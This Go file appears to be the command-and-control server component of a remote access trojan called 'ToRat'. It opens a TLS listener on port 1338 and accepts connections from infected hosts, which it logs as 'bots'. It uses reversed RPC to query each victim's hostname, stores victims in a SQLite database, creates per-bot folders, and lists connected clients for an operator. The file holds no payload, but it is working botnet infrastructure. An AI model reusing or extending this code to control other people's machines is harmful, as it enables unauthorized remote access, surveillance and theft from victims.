package server

import (
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"net/rpc"
	"os"
	"path/filepath"
	"strconv"

	"github.com/fatih/color"
	"github.com/jinzhu/gorm"
	_ "github.com/jinzhu/gorm/dialects/sqlite" //sqlite
)

const port = ":1338"

var db *gorm.DB

var activeClients []activeClient

// Start runs the server
func Start() {
	var err error
	db, err = gorm.Open("sqlite3", "ToRat.db")
	if err != nil {
		log.Fatalln("Could not open db", err)
	}

	defer db.Close()

	// Migrate the schema
	db.AutoMigrate(&Client{})

	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
	if err != nil {
		log.Println("could not load cert", err)
		return
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}}
	ln, err := net.Listen("tcp", port)
	if err != nil {
		fmt.Println(err)
		return
	}
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("accepting failed:", err)
			continue
		}
		//log.Println("got new connection")
		tlsconn := tls.Server(conn, &config)
		go accept(tlsconn)
	}
}

func accept(conn net.Conn) {
	var c activeClient

	c.RPC = rpc.NewClient(conn)
	err := c.GetHostname()
	if err != nil {
		log.Println("Invalid Hostname", err)
		return
	}
	c.Client = Client{Hostname: c.Hostname, Path: filepath.Join("bots", c.Hostname)}
	log.Println(&c.Client, Client{Hostname: c.Hostname})
	log.Println(db)
	db.FirstOrCreate(&c.Client, Client{Hostname: c.Hostname})

	if _, err = os.Stat(c.Client.Path); err != nil {
		os.MkdirAll(c.Client.Path, os.ModePerm)
	}
	if c.Client.Name == "" {
		c.Client.Name = c.Client.Hostname
	}
	db.Save(&c.Client)
	activeClients = append(activeClients, c)
	fmt.Println(green("[+] New Client"), blue(c.Client.Name), green("connected!"))
}

func listConn() []string {
	var clients []string
	for i, c := range activeClients {
		str := strconv.Itoa(i) + "\t" + c.Client.Hostname + "\t" + c.Client.Name
		clients = append(clients, str)
	}
	return clients
}

func printClients() {
	color.HiCyan("Clients:")
	list := listConn()
	for _, client := range list {
		color.Cyan(client)
	}
}

func getClient(target int) *activeClient {
	return &activeClients[target]
}
